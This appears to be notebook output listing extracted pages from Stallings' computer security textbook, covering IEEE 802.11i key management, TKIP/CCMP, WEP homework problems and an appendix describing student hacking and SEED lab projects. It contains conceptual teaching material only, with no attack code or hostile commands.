AP controlled port is still blocked to general \\nuser traffic. Although the authentication is successful, the ports remain blocked until \\nthe temporal keys are installed in the STA and AP , which occurs during the 4-way \\nhandshake.\\nKey Management Phase\\nDuring the key management phase, a variety of cryptographic keys are generated and \\ndistributed to STAs. There are two types of keys: pairwise keys used for communica-\\ntion between an STA and an AP , and group keys used for multicast communication. \\nFigure 24.10, based on [FRAN07], shows the two key hierarchies, and Table 24.3 \\ndefines the individual keys.\\nPairWiSe keyS Pairwise keys are used for communication between a pair of \\ndevices, typically between an STA and an AP . These keys form a hierarchy begin -\\nning with a master key from which other keys are derived dynamically and used for \\na limited period of time.\\nAt the top level of the hierarchy are two possibilities. A pre-shared key (PSK) \\nis a secret key shared by the AP and a STA and installed in some fashion outside \\nthe scope of IEEE 802.11i. The other alternative is the master session key (MSK) , \\nalso known as the AAAK, which is generated using the IEEE 802.1X protocol \\nduring the authentication phase, as described previously. The actual method of key \\ngeneration depends on the details of the authentication protocol used. In either case \\n(PSK or MSK), there is a unique key shared by the AP with each STA with which \\nit communicates. All the other keys derived from this master key are also unique \\nbetween an AP and an STA. Thus, each STA, at any time, has one set of keys, as \\ndepicted in the hierarchy of Figure 24.10a, while the AP has one set of such keys \\nfor each of its STAs.\\nThe pairwise master key (PMK)  is derived from the master key. If a PSK is \\nused, then the PSK is used as the PMK; if a MSK is used, then the PMK is derived \\nM24_STAL0611_04_GE_C24.indd   744 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 746, 'page_label': '745'}, page_content='from the MSK by truncation (if necessary). By the end of the authentication phase, \\nmarked by the 802.1x EAP Success message (see Figure 24.8), both the AP and the \\nSTA have a copy of their shared PMK.\\nThe PMK is used to generate the pairwise transient key (PTK), which in fact \\nconsists of three keys to be used for communication between an STA and an AP \\nafter they have been mutually authenticated. To derive the PTK, the HMAC-SHA-1 \\n function is applied to the PMK, the MAC addresses of the STA and AP , and nonces \\nFigure 24.10 IEEE 802.11i Key Hierarchies\\nOut-of-band path EAP method path\\nPre-shared key\\nEAPOL key conﬁrmation key EAPOL key encryption key Temporal key\\nPSK\\n256 bits\\n384 bits (CCMP)\\n512 bits (TKIP)\\n128 bits (CCMP)\\n256 bits (TKIP)\\n40 bits, 104 bits (WEP)\\n128 bits (CCMP)\\n256 bits (TKIP)\\n256 bits\\n128 bits\\nNo modiﬁcation\\nLegend\\nPossible truncation\\nPRF (pseudo-random\\nfunction) using\\nHMAC-SHA-1\\n128 bits\\nUser-deﬁned\\ncryptoid\\nEAP\\nauthentication\\nfollowing EAP authentication\\nor PSK\\nDuring 4-way handshake\\nThese keys are\\ncomponents of the PTK\\nÚ256 bits\\nPMK\\nKCK\\nPTK\\nKEK TK\\nAAAK or MSK\\nPairwise master key\\n(b) Group key hierarchy\\n(a) Pairwise key hierarchy\\nAAA key\\nPairwise transient key\\n256 bits Changes periodically\\nor if compromised\\nChanges based on\\npolicy (disassociation,\\ndeauthentication)\\nGMK (generated by AS)\\nGTK \\nGroup master key\\nGroup temporal key\\n24.4 / IEEE 802.11i WIRELESS LAN SECURITY  745\\nM24_STAL0611_04_GE_C24.indd   745 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 747, 'page_label': '746'}, page_content='746  CHAPTER 24 / WIRELESS NETWoRk SECURITY\\nAbbreviation Name Description/Purpose Size (bits) Type\\nAAA Key Authentication, \\nAccounting, and \\nAuthorization Key\\nUsed to derive the \\nPMK. Used with \\nthe IEEE 802.1X \\n authentication and key \\nmanagement approach. \\nSame as MMSK.\\nÚ 256 Key generation key, \\nroot key\\nPSK Pre-Shared Key Becomes the PMK \\nin pre-shared key \\nenvironments.\\n256 Key generation key, \\nroot key\\nPMK Pairwise  \\nMaster Key\\nUsed with other inputs \\nto derive the PTK.\\n256 Key generation key\\nGMK Group  \\nMaster Key\\nUsed with other inputs \\nto derive the GTK.\\n128 Key generation key\\nPTK Pairwise  \\nTransient Key\\nDerived from the PMK.  \\nComprises the \\nEAPOL-KCK, \\nEAPOL-KEK, and \\nTK and (for TKIP) the \\nMIC key.\\n512 (TKIP)\\n384 (CCMP)\\nComposite key\\nTK Temporal Key Used with TKIP or \\nCCMP to provide \\nconfidentiality and \\nintegrity protection for \\nunicast user traffic.\\n256 (TKIP)\\n128 (CCMP)\\nTraffic key\\nGTK Group  \\nTemporal Key\\nDerived from the \\nGMK. Used to provide \\nconfidentiality and \\nintegrity protection for \\nmulticast/broadcast \\nuser traffic.\\n256 (TKIP)\\n128 (CCMP)\\n40, 104 (WEP)\\nTraffic key\\nMIC Key Message Integrity \\nCode Key\\nUsed by TKIP’s \\nMichael MIC to  \\nprovide integrity  \\nprotection of messages.\\n64 Message integrity key\\nEAPOL-KCK EAPOL-Key  \\nConfirmation Key\\nUsed to provide  \\nintegrity  protection \\nfor key material \\n distributed during the \\n4-way handshake.\\n128 Message integrity key\\nEAPOL-KEK EAPOL-Key \\nEncryption Key\\nUsed to ensure the \\n confidentiality of the \\nGTK and other key \\nmaterial in the 4-way \\nhandshake.\\n128 Traffic key/key \\nencryption key\\nWEP Key Wired Equivalent \\nPrivacy Key\\nUsed with WEP . 40, 104 Traffic key\\nTable 24.3 IEEE 802.11i Keys for Data Confidentiality and Integrity Protocols\\nM24_STAL0611_04_GE_C24.indd   746 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 748, 'page_label': '747'}, page_content='generated when needed. Using the STA and AP addresses in the generation of the \\nPTK provides protection against session hijacking and impersonation; using nonces \\nprovides additional random keying material.\\nThe three parts of the PTK are as follows:\\n• EAP Over LAN (EAPOL) Key Confirmation Key (EAPOL-KCK):  Supports \\nthe integrity and data origin authenticity of STA-to-AP control frames  during \\noperational setup of an RSN. It also performs an access control function:  \\nproof-of-possession of the PMK. An entity that possesses the PMK is  authorized \\nto use the link.\\n• EAPOL Key Encryption Key (EAPOL-KEK): Protects the confidentiality of \\nkeys and other data during some RSN association procedures.\\n• Temporal Key (TK): Provides the actual protection for user traffic.\\ngrouP keyS Group keys are used for multicast communication in which one STA \\nsends MPDUs to multiple STAs. At the top level of the group key hierarchy is the \\ngroup master key (GMK). The GMK is a key-generating key used with other inputs \\nto derive the group temporal key (GTK). Unlike the PTK, which is generated using \\nmaterial from both AP and STA, the GTK is generated by the AP and transmitted  \\nto its associated STAs. Exactly how this GTK is generated is undefined. IEEE \\n802.11i, however, requires that its value is computationally indistinguishable from \\nrandom. The GTK is distributed securely using the pairwise keys that are already \\nestablished. The GTK is changed every time a device leaves the network.\\nPairWiSe key diSTribuTion The upper part of Figure 24.11 shows the MPDU \\nexchange for distributing pairwise k eys. This exchange is known as the 4-way \\n handshake. The STA and AP use this handshake to confirm the existence of the PMK, \\nverify the selection of the cipher suite, and derive a fresh PTK for the following data \\nsession. The four parts of the exchange are as follows:\\n• AP uSTA: Message includes the MAC address of the AP and a nonce \\n(Anonce)\\n• STA uAP: The STA generates its own nonce (Snonce) and uses both nonces \\nand both MAC addresses, plus the PMK, to generate a PTK. The STA then \\nsends a message containing its MAC address and Snonce, enabling the AP to \\ngenerate the same PTK. This message includes a message integrity code (MIC)2 \\nusing HMAC-MD5 or HMAC-SHA-1 -128. The key used with the MIC is KCK.\\n• AP uSTA: The AP is now able to generate the PTK. The AP then sends a \\nmessage to the STA, containing the same information as in the first message, \\nbut this time including a MIC.\\n• STA uAP: This is merely an acknowledgment message, again protected by  \\na MIC.\\n2While MAC is commonly used in cryptography to refer to a message authentication code, the term MIC \\nis used instead in connection with 802.11i because MAC has another standard meaning, medium access \\ncontrol, in networking.\\n24.4 / IEEE 802.11i WIRELESS LAN SECURITY  747\\nM24_STAL0611_04_GE_C24.indd   747 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 749, 'page_label': '748'}, page_content='748  CHAPTER 24 / WIRELESS NETWoRk SECURITY\\ngrouP key diSTribuTion For group key distribution, the AP generates a GTK \\nand distributes it to each STA in a multicast group. The two-message exchange with \\neach STA consists of the following:\\n• AP uSTA: This message includes the GTK, encrypted either with RC4 or with \\nAES. The key used for encryption is KEK. A MIC value is appended.\\n• STA uAP: The STA acknowledges receipt of the GTK. This message includes \\na MIC value.\\nFigure 24.11 IEEE 802.11i Phases of Operation: 4-Way Handshake and Group Key Handshake\\nSTA AP\\nMessage 1 delivers a nonce to the STA\\nso it can generate the PTK\\nMessage 1 delivers a new GTK to\\nthe STA. The GTK is encrypted\\nbefore it is sent and the entire\\nmessage is integrity protected\\nThe AP installs the GTK\\nMessage 3 demonstrates to the STA that\\nthe authenticator is alive, ensures that the\\nPTK is fresh (new) and that there is no\\nman-in-the-middle\\nMessage 2 delivers another nonce to the\\nAP so that it can also generate the\\nPTK. It demonstrates to the AP that\\nthe STA is alive, ensures that the\\nPTK is fresh (new) and that there is no\\nman-in-the-middle\\nThe STA decrypts the GTK\\nand installs it for use\\nMessage 2 is delivered to the \\nAP. This frame serves only as\\nan acknowledgment to the AP\\nMessage 4 serves as an acknowledgment to\\nMessage 3. It serves no cryptographic\\nfunction. This message also ensures the\\nreliable start of the group key handshake\\nMessage 2\\nEAPOL-key (Snonce,\\nUnicast, MIC)\\nMessage 1\\nEAPOL-key (Anonce, Unicast) \\nMessage 1\\nEAPOL-key (GTK, MIC) \\nMessage 4\\nEAPOL-key (Unicast, MIC)\\nMessage 2\\nEAPOL-key (MIC)\\nMessage 3\\nEAPOL-key (Install PTK,\\nUnicast, MIC) \\nAP’s 802.1X controlled port blocked\\nAP’s 802.1X controlled port\\n unblocked for unicast traﬃc\\nM24_STAL0611_04_GE_C24.indd   748 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 750, 'page_label': '749'}, page_content='Protected Data Transfer Phase\\nIEEE 802.11i defines two schemes for protecting data transmitted in 802.11 MPDUs: \\nthe Temporal Key Integrity Protocol (TKIP) and the Counter Mode-CBC MAC \\nProtocol (CCMP).\\nTkiP TKIP is designed to require only software changes to devices that are imple-\\nmented with the older wireless LAN security approach called Wired Equivalent \\n Privacy (WEP). TKIP provides two services:\\n• Message integrity:  TKIP adds a message integrity code to the 802.11 MAC \\nframe after the data field. The MIC is generated by an algorithm, called Michael, \\nthat computes a 64-bit value using as input the source and destination MAC \\naddress values and the data field, plus key material.\\n• Data confidentiality: Data confidentiality is provided by encrypting the MPDU \\nplus MIC value using RC4.\\nThe 256-bit TK (see Figure 24.10) is employed as follows. Two 64-bit keys are \\nused with the Michael message digest algorithm to produce a message integrity code. \\nOne key is used to protect STA-to-AP messages, and the other key is used to protect \\n AP-to-STA messages. The remaining 128 bits are truncated to generate the RC4 key \\nused to encrypt the transmitted data.\\nFor additional protection, a monotonically increasing TKIP sequence counter \\n(TSC) is assigned to each frame. The TSC serves two purposes. First, the TSC is \\nincluded with each MPDU and is protected by the MIC to protect against replay \\nattacks. Second, the TSC is combined with the session TK to produce a dynamic \\nencryption key that changes with each transmitted MPDU, thus making cryptanalysis \\nmore difficult.\\nccmP CCMP is intended for newer IEEE 802.11 devices that are equipped with \\nthe hardware to support this scheme. As with TKIP , CCMP provides two services:\\n• Message integrity: CCMP uses the cipher block chaining message authentica -\\ntion code (CBC-MAC), described in Chapter 12.\\n• Data confidentiality: CCMP uses the CTR block cipher mode of operation with \\nAES for encryption. CTR is described in Chapter 20.\\nThe same 128-bit AES key is used for both integrity and confidentiality. \\nThe scheme uses a 48-bit packet number to construct a nonce to prevent replay \\nattacks.\\nThe IEEE 802.11i Pseudorandom Function\\nAt a number of places in the IEEE 802.11i scheme, a pseudorandom function (PRF) \\nis used. For example, it is used to generate nonces, to expand pairwise keys, and \\nto generate the GTK. Best security practice dictates that different pseudorandom \\nnumber streams be used for these different purposes. However, for implementa -\\ntion efficiency, we would like to rely on a single pseudorandom number generator \\nfunction.\\n24.4 / IEEE 802.11i WIRELESS LAN SECURITY  749\\nM24_STAL0611_04_GE_C24.indd   749 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 751, 'page_label': '750'}, page_content='750  CHAPTER 24 / WIRELESS NETWoRk SECURITY\\nThe PRF is built on the use of HMAC-SHA-1 to generate a pseudorandom \\nbit stream. Recall that HMAC-SHA-1 takes a message (block of data) and a key of \\nlength at least 160 bits and produces a 160-bit hash value. SHA-1 has the property that \\nthe change of a single bit of the input produces a new hash value with no apparent \\nconnection to the preceding hash value. This property is the basis for pseudorandom \\nnumber generation.\\nThe IEEE 802.11i PRF takes four parameters as input and produces the desired \\nnumber of random bits. The function is of the form PRF(K, A, B, Len), where\\n K = a secret key\\n A = a text string specific to the application (e.g., nonce generation or pairwise \\nkey expansion)\\n B = some data specific to each case\\n Len = desired number of pseudorandom bits\\nFor example, for the pairwise transient key for CCMP:\\nPTK = PRF(PMK, “Pairwise key expansion,” min(AP-Addr, STA-Addr) }   \\nmax (AP-Addr, STA-Addr) }  min(Anonce, Snonce) }  max(Anonce, Snonce), 384)\\nSo, in this case, the parameters are\\n K = PMK\\n A = the text string “Pairwise key expansion”\\n B = a sequence of bytes formed by concatenating the two MAC addresses \\nand the two nonces\\n Len = 384 bits\\nSimilarly, a nonce is generated by\\nNonce = PRF(Random Number, “Init Counter,” MAC }  Time, 256)\\nWhere Time is a measure of the network time known to the nonce generator. \\nThe group temporal key is generated by:\\nGTK = PRF(GMK, “Group key expansion,” MAC }  Gnonce, 256)\\nFigure 24.12 illustrates the function PRF(K, A, B, Len). The parameter K serves \\nas the key input to HMAC. The message input consists of four items concatenated \\ntogether: the parameter A, a byte with value 0, the parameter B, and a counter i. The \\ncounter is initialized to 0. The HMAC algorithm is run once, producing a 160-bit hash \\nvalue. If more bits are required, HMAC is run again with the same inputs, except that \\ni is incremented each time until the necessary number of bits is generated. We can \\nexpress the logic as\\nPRF(K, A, B, Len)\\nR d null string\\nfor i d 0 to ((Len + 159)/160 - 1) do\\nR d R  ‘  HMAC-SHA-1(K, A  ‘  0  ‘  B  ‘  i)\\nReturn Truncate-to-Len(R, Len)\\nM24_STAL0611_04_GE_C24.indd   750 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 752, 'page_label': '751'}, page_content='24.5 / kEY TERMS, REVIEW QUESTIoNS, AND PRoBLEMS  751\\n 24.5 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nFigure 24.12 IEEE 802.11i Pseudorandom Function\\nHMAC-SHA-1\\n| |\\nK\\nA 0 B i\\nR = HMAC-SHA-1( K , A || 0 || B || i)\\n+ 1\\nKey Terms\\n4-way handshake\\naccess point (AP)\\nbasic service set (BSS)\\nCounter Mode-CBC MAC \\nProtocol (CCMP)\\ndistribution system (DS)\\nextended service set (ESS)\\ngroup keys\\nIEEE 802.1X\\nIEEE 802.11\\nIEEE 802.11i\\nindependent BSS (IBSS)\\nlogical link control (LLC)\\nmedium access control (MAC)\\nMAC header\\nMAC protocol data unit \\n(MPDU)\\nMAC service data unit (MSDU)\\nMAC trailer\\nmessage integrity code (MIC)\\nMichael\\npairwise keys\\nphysical layer\\npseudorandom function\\nRobust Security Network \\n(RSN)\\nTemporal Key Integrity \\n Protocol (TKIP)\\nWi-Fi\\nWi-Fi Protected Access (WPA)\\nWired Equivalent Privacy \\n(WEP)\\nwireless LAN (WLAN)\\nReview Questions\\n 24.1 What is the basic building block of an 802.11 WLAN?\\n 24.2 Define an extended service set.\\n 24.3 List and briefly define IEEE 802.11 services.\\n 24.4 Which assumptions form the basis of security policy for mobile devices?\\n 24.5 List the seven major security concerns for mobile devices.\\n 24.6 Briefly describe the pseudorandom stream generation of the IEEE 802.11i scheme and \\nlist some uses of the pseudorandom function.\\n 24.7 Briefly describe the four IEEE 802.11i phases of operation.\\n 24.8 What is the difference between TKIP and CCMP?\\nM24_STAL0611_04_GE_C24.indd   751 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 753, 'page_label': '752'}, page_content='752  CHAPTER 24 / WIRELESS NETWoRk SECURITY\\nProblems\\n 24.1 In IEEE 802.11, open system authentication simply consists of two communications . \\nAn authentication is requested by the client, which contains the station ID (typically \\nthe MAC address). This is followed by an authentication response from the AP/router \\ncontaining a success or failure message. An example of when a failure may occur is if \\nthe client’s MAC address is explicitly excluded in the AP/router configuration.\\na. What are the benefits of this authentication scheme?\\nb. What are the security vulnerabilities of this authentication scheme?\\n 24.2 Prior to the introduction of IEEE 802.11i,  the security scheme for IEEE 802.11 was \\nWired Equivalent Privacy (WEP). WEP assumed all devices in the network share a \\nsecret key. The purpose of the authentication scenario is for the STA to prove that \\nit possesses the secret key. Authentication proceeds as shown in Figure 24.13. The \\nSTA sends a message to the AP requesting authentication. The AP issues a challenge, \\nwhich is a sequence of 128 random bytes, sent as plaintext. The STA encrypts the \\nchallenge with the shared key and returns it to the AP . The AP decrypts the incoming \\nvalue and compares it to the challenge that it sent. If there is a match, the AP confirms \\nthat authentication has succeeded.\\na. What are the benefits of this authentication scheme?\\nb. This authentication scheme is incomplete . What is missing and why is this \\n important? Hint: The addition of one or two messages would fix the problem.\\nc. What is a cryptographic weakness of this scheme?\\n 24.3 For WEP , data integrity and data confidentiality are achieved using the RC4 stream \\nencryption algorithm. The transmitter of an MPDU performs the following steps, \\nreferred to as encapsulation:\\n1. The transmitter selects an initial vector (IV) value.\\n2. The IV v alue is concatenated with the WEP key shared by transmitter and \\nreceiver to form the seed, or key input, to RC4.\\nFigure 24.13 WEP Authentication\\nSTA AP\\nRequestStation sends a request\\nfor authentication\\nAP sends challenge message\\ncontainting 128-bit random\\nnumber\\nAP decrypts challenge response.\\nIf match, send authentication\\nsuccess message\\nStation responds\\nwith encrypted version\\nof challenge number\\nResponse\\nChallenge\\n Success\\nM24_STAL0611_04_GE_C24.indd   752 10/11/17   3:20 PM\\nhttps://sanet.st/blogs/polatebooks'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 754, 'page_label': '753'}, page_content='24.5 / kEY TERMS, REVIEW QUESTIoNS, AND PRoBLEMS  753\\n3. A 32-bit cyclic r edundancy check (CRC) is computed over all the bits of the \\nMAC data field and appended to the data field. The CRC is a common error-\\ndetection code used in data link control protocols. In this case, the CRC serves \\nas a integrity check value (ICV).\\n4. The result of step 3 is encrypted using RC4 to form the ciphertext block.\\n5. The plaintext IV is prepended to the ciphertext block to form the encapsulated \\nMPDU for transmission.\\na. Draw a block diagram that illustrates the encapsulation process.\\nb. Describe the steps at the receiver end to recover the plaintext and perform the \\nintegrity check.\\nc. Draw a block diagram that illustrates part b.\\n 24.4 A potential weakness of the CRC as an integrity check is that it is a linear function.  \\nThis means that you can predict which bits of the CRC are changed if a single bit of \\nthe message is changed. Furthermore, it is possible to determine which combination \\nof bits could be flipped in the message so the net result is no change in the CRC. Thus, \\nthere are a number of combinations of bit flippings of the plaintext message that leave \\nthe CRC unchanged, so message integrity is defeated. However, in WEP , if an attacker \\ndoes not know the encryption key, the attacker does not have access to the plaintext, \\nonly to the ciphertext block. Does this mean that the ICV is protected from the bit \\nflipping attack? Explain.\\nM24_STAL0611_04_GE_C24.indd   753 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 755, 'page_label': '754'}, page_content='754\\nAppendix A \\nprojects And other student exercises  \\nfor teAching computer security\\nMany instructors believe that research or implementation projects are crucial to \\nthe clear understanding of computer security. Without projects, it may be difficult \\nfor students to grasp some of the basic concepts and interactions among security \\nfunctions. Projects reinforce the concepts introduced in the book, give the stu -\\ndent a greater appreciation of how a cryptographic algorithm or security function \\nworks, and can motivate students and give them confidence that they are capable \\nof not only understanding but implementing the details of a security capability.\\nIn this text, we have tried to present the concepts of computer security as \\nclearly as possible and have provided numerous homework problems to reinforce \\nthose concepts. However, many instructors will wish to supplement this material \\nwith projects. This appendix provides some guidance in that regard and describes \\nsupport material available in the Instructor’s Resource Center (IRC) for this book, \\naccessible from Pearson for instructors. The support material covers 11 types of \\nprojects and other student exercises:\\n• Hacking projects\\n• Laboratory exercise\\n• Security education (SEED) projects\\n• Research projects\\n• Programming projects\\n• Practical security assessments\\n• Firewall projects\\n• Case studies\\n• Reading/report assignments\\n• Writing assignments\\n• Webcasts for teaching computer security\\n A.1 HACKING PROJECT\\nThe aim of this project is to hack into a corporation’s network through a series of \\nsteps. The corporation is named Extreme In Security Corporation. As the name \\nindicates, the corporation has some security holes in it and a clever hacker is \\nable to access critical information by hacking into its network. The IRC includes \\nwhat is needed to set up the Website. The student’s goal is to capture the secret \\nZ01_STAL0611_04_GE_APPA.indd   754 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 756, 'page_label': '755'}, page_content='A.3 / SECURITY EDUCATION (SEED) PROJECTS  755\\ninformation about the price on the quote the corporation is placing next week to \\nobtain a contract for a governmental project.\\nThe student should start at the Website and find his or her way into the \\nnetwork. At each step, if the student succeeds, there are indications as to how to \\nproceed on to the next step as well as the grade until that point.\\nThe project can be attempted in three ways:\\n1. Without seeking any sort of help\\n2. Using some provided hints\\n3. Using exact directions\\nThe IRC includes the files needed for this project:\\n1. Web Security project named extremeinsecure (extremeinsecure.zip)\\n2. Web Hacking exer cises (XSS and Script-attacks) covering client-side and \\nserver-side vulnerability exploitations respectively (webhacking.zip)\\n3. Documentation for installation and use for the above (description.doc)\\n4. A PowerPoint file describing Web hacking (Web_Security.ppt). This file is \\ncrucial to understanding how to use the exercises, since it clearly explains the \\noperation using screen shots.\\nThis project was designed and implemented by Professor Sreekanth Malladi \\nof Dakota State University.\\n A.2 LABORATORY EXERCISES\\nProfessor Sanjay Rao and Ruben Torres of Purdue University have prepared a set \\nof laboratory exercises that are part of the IRC. These are implementation proj -\\nects designed to be programmed on Linux, but could be adapted for any UNIX \\n environment. These laboratory exercises provide realistic experience in imple -\\nmenting security functions and applications.\\n A.3 SECURITY EDUCATION (SEED) PROJECTS\\nThe SEED projects are a set of hands-on exercises, or labs, covering a wide range of \\nsecurity topics. They were designed by Professor Wenliang Du of  Syracuse  University \\nfor use by other instructors [DU11]. The SEED lab exercises are designed so no \\ndedicated physical laboratory is needed. All SEED labs can be carried out on stu -\\ndents’ personal computers or in a general computing laboratory. The collection \\nconsists of three types of lab exercises:\\n• Vulnerability and attack labs: These 12 labs cover many common vulnerabilities \\nand attacks. In each lab, students are given a system (or program) with hid -\\nden vulnerabilities. Based upon the hints provided, students must find these \\n vulnerabilities, then devise strategies to exploit them. Students also need to \\nZ01_STAL0611_04_GE_APPA.indd   755 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 757, 'page_label': '756'}, page_content='756  APPENDIX A / PROJECTS AND OTHER STUDENT EXERCISES\\ndemonstrate ways to defend against the attacks or comment on the prevailing \\nmitigating methods and their effectiveness.\\n• Exploration labs: The objective of these 9 labs is to enhance students’ learning \\nvia observation, playing, and exploration, so they can understand what security \\nprinciples feel like in a real system; and to provide students with opportunities \\nto apply security principles in analyzing and evaluating systems.\\n• Design and implementation labs: In security education, students should also be \\ngiven opportunities to apply security principles in designing and implementing \\nsystems. The challenge is to design meaningful assignments that do not require \\na major commitment of time. The 9 labs in this category meet this requirement.\\nTable A.1 maps the 30 lab exercises in the SEED repertoire to the relevant \\nchapters in the book, together with an estimate of the number of weeks required for \\nthe typical student to complete a lab, assuming about 10 hours per week devoted to \\nthe task.\\nTable A.1   Mapping of SEED Labs to Textbook Chapters\\nTypes Labs Time (weeks) Chapters\\nVulnerability and  \\nAttack Labs (Linux-based)\\nBuffer Overflow Vulnerability 1 10\\nReturn-to-libc Attack 1 10\\nFormat String Vulnerability 1 11\\nRace Condition Vulnerability 1 11\\nSet-UID Program Vulnerability 1 11\\nChroot Sandbox Vulnerability 1 12\\nCross-Site Request Forgery Attack 1 11\\nCross-Site Scripting Attack 1 11\\nSQL Injection Attack 1 5\\nClickjacking Attack 1 6\\nTCP/IP Attacks 2 7,  2 2\\nDNS Pharming Attacks 2 22\\nExploration Labs (Linux-based)\\nPack Sniffing & Spoofing 1 22\\nPluggable Authentication Module 1 3\\nWeb Access Control 1 4, 6\\nSYN Cookie 1 7,  2 2\\nLinux Capability-Based Access Control 1 4, 12\\nSecret-Key Encryption 1 20\\nOne-Way Hash Function 1 21\\nPublic-Key Infrastructure 1 21, 23\\nLinux Firewall Exploration 1 9\\n(Continued)\\nZ01_STAL0611_04_GE_APPA.indd   756 10/11/17   3:29 PM'),\n",
